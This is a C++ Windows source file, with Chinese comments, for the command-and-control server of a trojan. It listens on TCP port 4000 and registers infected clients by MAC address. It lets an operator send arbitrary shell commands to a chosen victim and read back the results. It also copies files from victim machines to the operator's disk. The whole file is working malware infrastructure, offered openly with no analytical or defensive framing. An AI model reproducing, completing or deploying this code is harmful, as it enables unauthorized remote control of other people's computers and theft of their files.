// Server.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <iostream>
#include <winsock2.h>
using namespace std;

#pragma comment(lib, "ws2_32.lib")
#define LOCAL_PORT 4000
#define LOCAL_IP_ADDRESS "0.0.0.0"

#define CMD_NULL		0
#define CMD_CMD			1
#define CMD_DOWNLOAD	2

#define MAX_CMD_LEN		256
#define MAC_ADDR_LEN	18
#define DEFAULT_BUFLEN 1024

typedef struct _TROJAN_INFO
{
	short live_flag;
	char mac[MAC_ADDR_LEN];
	short cmd_no;
	char cmd[MAX_CMD_LEN];
}TROJAN_INFO, *PTROJAN_INFO;
// cmd like:
// dir
// remoteFile*localFile: c:\\1.txt*d:\\2.txt

#define MAX_CLIENT_NUM		10
#define NOW_CLIENT_NUM		3
TROJAN_INFO g_trojan_info[MAX_CLIENT_NUM];
bool inflag = 0;
int now_client_num = 0;

CRITICAL_SECTION cs;
//EnterCriticalSection(&cs);
//LeaveCriticalSection(&cs);

char* protocolHead = "HTTP/1.1 200 OK\r\nServer: Server <0.1>\r\n"
"Accept-Ranges: bytes\r\nContent-Length: %d\r\nConnection: close\r\n"
"Content-Type: %s\r\n\r\n";


char * killhead(char* headcmd)
{
	return strncpy(headcmd, strstr(headcmd, "\r\n\r\n")+4, MAC_ADDR_LEN);
}

char* combine(char *s1, char *s2)
{
	char *result = (char *)malloc(strlen(s1) + strlen(s2) + 1);
	if (result == NULL) exit(1);
	strcpy(result, s1);
	strcat(result, s2);
	return result;
}


void init()
{
	int i = 0;
	for(i=0; i<MAX_CLIENT_NUM; i++)
	{
		g_trojan_info[i].live_flag = 0;
		memset(g_trojan_info[i].mac, 0, MAC_ADDR_LEN);
		g_trojan_info[i].cmd_no = CMD_NULL;
		memset(g_trojan_info[i].cmd, 0, MAX_CMD_LEN);
	}

	InitializeCriticalSection(&cs);
}

int recvn(SOCKET s, char* recvbuf, unsigned int fixedlen)
{
	int iResult;    //存储单次recv操作的返回值
	int cnt;         //用于统计相对于固定长度，剩余多少字节尚未接收
	cnt = fixedlen;
	while ( cnt > 0 ) {
		iResult = recv(s, recvbuf, cnt, 0);
		if ( iResult < 0 ){
			//数据接收出现错误，返回失败
			printf("接收发生错误: %d\n", WSAGetLastError());
			return -1;
		}
		if ( iResult == 0 ){
			//对方关闭连接，返回已接收到的小于fixedlen的字节数
			printf("连接关闭\n");
			return fixedlen - cnt;
		}
		//printf("接收到的字节数: %d\n", iResult);
		//接收缓存指针向后移动
		recvbuf +=iResult;
		//更新cnt值
		cnt -=iResult;         
	}
	return fixedlen;
}

void remove_trojan_from_list(char *MacAddr)
{
	
	int i = 0;
	for(i=0; i<MAX_CLIENT_NUM; i++)
	{
		if(0 == memcmp(g_trojan_info[i].mac, MacAddr, MAC_ADDR_LEN))
		{
			g_trojan_info[i].live_flag = 0;
			memset(g_trojan_info[i].mac, 0, MAC_ADDR_LEN);
			g_trojan_info[i].cmd_no = CMD_NULL;
			memset(g_trojan_info[i].cmd, 0, MAX_CMD_LEN);
			break;
		}
	}
}

void add_trojan_to_list(char *MacAddr)
{
	int i = 0;
	int free_index = -1;
    
	for(i=0; i<MAX_CLIENT_NUM; i++)
	{
		if(g_trojan_info[i].live_flag == 0)
		{
			free_index = i;
			cout << i;
			break;
		}
	}

	if(free_index != -1)
	{
		g_trojan_info[free_index].live_flag = 1;
		memcpy(g_trojan_info[free_index].mac, MacAddr, MAC_ADDR_LEN);
		g_trojan_info[free_index].cmd_no = CMD_NULL;
		memset(g_trojan_info[free_index].cmd, 0, MAX_CMD_LEN);
	}

}

int get_cmd_by_mac(char *MacAddr, char *CmdBuff)
{
	int i = 0;
	int CmdNo = CMD_NULL;
	for(i=0; i<MAX_CLIENT_NUM; i++)
	{
		if(0 == memcmp(g_trojan_info[i].mac, MacAddr, MAC_ADDR_LEN))
		{
			CmdNo = g_trojan_info[i].cmd_no;
			sprintf(CmdBuff, "%d#%s", CmdNo, g_trojan_info[i].cmd);
			g_trojan_info[i].cmd_no = CMD_NULL;
			break;
		}
	}
	return CmdNo;
}

void cmd()
{
	int i = 0;
	int free_index = -1;
	int kind;
	if (inflag|| now_client_num<NOW_CLIENT_NUM)return;
	inflag = 1;
	/*cout << "是否发送指令"  << "？(y/n)   ";
	char a;
	cin >> a;
	if (a == 'y' || a == 'Y')
	{*/
		

	EnterCriticalSection(&cs);

	char  MacAddr[MAC_ADDR_LEN];
	cout << "\n请输入要发送的客户端Mac地址： ";
	cin >> MacAddr;

	for (i = 0; i<MAX_CLIENT_NUM; i++)
	{
		if (0 == memcmp(g_trojan_info[i].mac, MacAddr, MAC_ADDR_LEN))
		{
			free_index = i;
			break;
		}
	}

	if (free_index != -1)
	{
		g_trojan_info[free_index].live_flag = 1;
		//memcpy(g_trojan_info[free_index].mac, MacAddr, MAC_ADDR_LEN);
		cout << "请输入要发送的指令种类：" << endl << "1.普通指令 2.文件下载指令" << endl << "(1/2)  ";
		cin >> kind;
		if (kind == 1)
		{
			g_trojan_info[free_index].cmd_no = CMD_CMD;
		}
		if (kind == 2)
		{
			g_trojan_info[free_index].cmd_no = CMD_DOWNLOAD;
		}
		cout << "输入要发送的指令：";
		cin >> g_trojan_info[free_index].cmd;
	}
	else { cout << "客户端mac地址错误！"; }


	/*}
	else{ g_trojan_info[free_index].cmd_no = CMD_NULL; }*/

	LeaveCriticalSection(&cs);
	inflag = 0;
	return;
}

DWORD WINAPI InputThread(LPVOID lpParameter)
{
	SOCKET ClientSocket = (SOCKET)lpParameter;
	int i = 0;
	int free_index = -1;
	int kind;
	/*if (inflag || now_client_num<NOW_CLIENT_NUM)return;
	inflag = 1;*/

	while (TRUE)
	{
		char  MacAddr[MAC_ADDR_LEN];
		cout << "请输入要发送的客户端Mac地址： ";
		cin >> MacAddr;

		cout << "->"<<now_client_num;
		for (i = 0; i<MAX_CLIENT_NUM; i++)
		{
			cout << g_trojan_info[i].mac << endl;
			if (0 == memcmp(g_trojan_info[i].mac, MacAddr, MAC_ADDR_LEN))
			{
				free_index = i;
				break;
			}
		}

		if (free_index != -1)
		{
			g_trojan_info[free_index].live_flag = 1;
			//memcpy(g_trojan_info[free_index].mac, MacAddr, MAC_ADDR_LEN);
			cout << "请输入要发送的指令种类：" << endl << "1.普通指令 2.文件下载指令" << endl << "(1/2)  ";
			cin >> kind;
			if (kind == 1)
			{
				g_trojan_info[free_index].cmd_no = CMD_CMD;
			}
			if (kind == 2)
			{
				g_trojan_info[free_index].cmd_no = CMD_DOWNLOAD;
			}
			cout << "输入要发送的指令：";
			cin >> g_trojan_info[free_index].cmd;
		}
		else { cout << "客户端mac地址错误！"; }

		Sleep(1000);
		/*}
		else{ g_trojan_info[free_index].cmd_no = CMD_NULL; }*/

		/*inflag = 0;
		return;*/
	}

	closesocket(ClientSocket);
	return 0;
}

DWORD WINAPI ClientThread(LPVOID lpParameter)
{
	SOCKET ClientSocket = (SOCKET)lpParameter;
	int Ret = 0;
	char RecvBuffer[MAX_PATH];
	int CmdNo;
	DWORD CmdLen;
	char CmdBuff[MAX_CMD_LEN];
	char LocalFile[MAX_PATH];
	char *strTmp;
	bool bFirst = true;
	now_client_num++;

	while( TRUE )
	{
		memset(RecvBuffer, 0, MAX_PATH);
		Ret = recv(ClientSocket, RecvBuffer, MAX_PATH,0);
		if (Ret > 0)
		{
			cout << "接收到GET请求：" << RecvBuffer << "(" << Ret << ")" << endl;
		}

		memset(RecvBuffer, 0, MAX_PATH);
		Ret = recv(ClientSocket, RecvBuffer, MAX_PATH,0);
		if (Ret > 0)
		{
			cout << "接收到POST请求：" << RecvBuffer << "(" << Ret << ")" << endl;
		}
		cout << "\n--------------------------------\n连接到木马！mac地址为" << killhead(RecvBuffer) << endl;

		/*if ( Ret != MAX_PATH)
		{
			cout << "客户端异常，退出!" << endl;
			remove_trojan_from_list(RecvBuffer);
			break;
		}*/
		
		if(bFirst){
			cout << "添加到木马列表" << endl;
			remove_trojan_from_list(RecvBuffer);
			add_trojan_to_list(RecvBuffer);
			bFirst = false;
		}

		//cmd(RecvBuffer);
		
		
		// check if the trojan has an cmd to do
		memset(CmdBuff, 0, MAX_CMD_LEN);
		CmdNo = get_cmd_by_mac(RecvBuffer, CmdBuff);

		char recvbuf[DEFAULT_BUFLEN];
		FILE *file = NULL;
		char *filename = LocalFile;
		int invfilelen, filelen;
		int recvbuflen = DEFAULT_BUFLEN;
		int iResult;

		switch(CmdNo)
		{
		case CMD_NULL:
			//cout << "暂时未发送命令！\n";
			CmdLen = 0;
			send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
			break;
		case CMD_CMD:
			cout << "执行命令" << CmdBuff << endl;
			cout << "命令长度为" << strlen(CmdBuff) << "!\n";
			CmdLen = htonl(strlen(CmdBuff));
			// send cmd len
			send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
			// send cmd content
			send(ClientSocket, CmdBuff, strlen(CmdBuff), 0);
			// recv cmd result from trojan
			iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
			printf("接收到返回数据:  %s(%d)\n", recvbuf, iResult);
			break;
		case CMD_DOWNLOAD:
			cout << "执行文件下载" << endl;
			// get local file name
			strTmp = strstr(CmdBuff, "*");
			strcpy(LocalFile, strTmp+1);

			// reset cmd information
			CmdBuff[strTmp-CmdBuff] = '\0';
			CmdLen = htonl(strlen(CmdBuff));
			cout << "目标文件为" << CmdBuff << endl;
			// send cmd len
			send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
			// send cmd content
			send(ClientSocket, CmdBuff, strlen(CmdBuff), 0);
			// recv file from trojan


			

			iResult = recv(ClientSocket, recvbuf, sizeof(char *), 0);
			if (iResult >0)
			{
				invfilelen = *((int *)recvbuf);
				cout << "数据长度的网络字节序为  " << invfilelen << endl;
				filelen = ntohl(invfilelen);
				cout << "数据长度为  " << filelen << endl;
			}
			file = fopen(filename, "wb+");
			if (file == NULL) { cout << "打开文件失败！" << endl; return -1; }

			int torecvlen = filelen;
			// 持续接收数据，直到对方关闭连接 
			do
			{
				iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
				if (iResult > 0)
				{
					cout << "还有" << torecvlen << "个字节需要接收" << endl;
					int recvlen = iResult;
					if (iResult > torecvlen)recvlen = torecvlen;
					fwrite(recvbuf, 1, recvlen, file);
					torecvlen -= recvlen;
					if (torecvlen <= 0)break;

					//情况1：成功接收到数据
					//printf("接收到数据:  %s(%d)\n", recvbuf, iResult);

				}
				else if (iResult == 0)
				{
					//情况2：连接关闭
					printf("连接关闭...\n");
				}
				else
				{
					//情况3：接收发生错误
					printf("接收发生错误！错误编号: %d\n", WSAGetLastError());
					closesocket(ClientSocket);
					return -1;
				}
			} while (iResult > 0);

			fclose(file);

			cout << "文件下载成功！" << endl;

			break;
		}
	}

	closesocket(ClientSocket);
	return 0;
}


int main(int argc, char* argv[])
{
	WSADATA  Ws;
	SOCKET ServerSocket, ClientSocket;
	struct sockaddr_in LocalAddr, ClientAddr;
	int Ret = 0;
	int AddrLen = 0;
	HANDLE hThread = NULL;
	HANDLE inThread = NULL;

	init();

	//Init Windows Socket
	if ( WSAStartup(MAKEWORD(2,2), &Ws) != 0 )
	{
		cout<<"Init Windows Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}

	//Create Socket
	ServerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if ( ServerSocket == INVALID_SOCKET )
	{
		cout<<"Create Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}

	LocalAddr.sin_family = AF_INET;
	LocalAddr.sin_addr.s_addr = inet_addr(LOCAL_IP_ADDRESS);
	LocalAddr.sin_port = htons(LOCAL_PORT);
	memset(LocalAddr.sin_zero, 0x00, 8);

	//Bind Socket
	Ret = bind(ServerSocket, (struct sockaddr*)&LocalAddr, sizeof(LocalAddr));
	if ( Ret != 0 )
	{
		cout<<"Bind Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}
	//listen
	Ret = listen(ServerSocket, 10);
	if ( Ret != 0 )
	{
		cout<<"listen Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}

	cout<<"服务端已经启动"<<endl;


	inThread = CreateThread(NULL, 0, InputThread, (LPVOID)ServerSocket, 0, NULL);
	if (inThread == NULL)
	{
		cout << "Create Thread Failed!" << endl;
	}

	while ( true )
	{
		AddrLen = sizeof(ClientAddr);
		ClientSocket = accept(ServerSocket, (struct sockaddr*)&ClientAddr, &AddrLen);
		if ( ClientSocket == INVALID_SOCKET )
		{
			cout<<"Accept Failed::"<<GetLastError()<<endl;
			break;
		}


		cout << "\n\n客户端连接::" << inet_ntoa(ClientAddr.sin_addr)<<":" << ClientAddr.sin_port << endl;

		hThread = CreateThread(NULL, 0, ClientThread, (LPVOID)ClientSocket, 0, NULL);
		if ( hThread == NULL )
		{
			cout<<"Create Thread Failed!"<<endl;
			break;
		}

		CloseHandle(hThread);
	}

	Sleep(INFINITE);

	CloseHandle(inThread);
	closesocket(ServerSocket);
	//closesocket(ClientSocket);
	WSACleanup();

	return 0;
}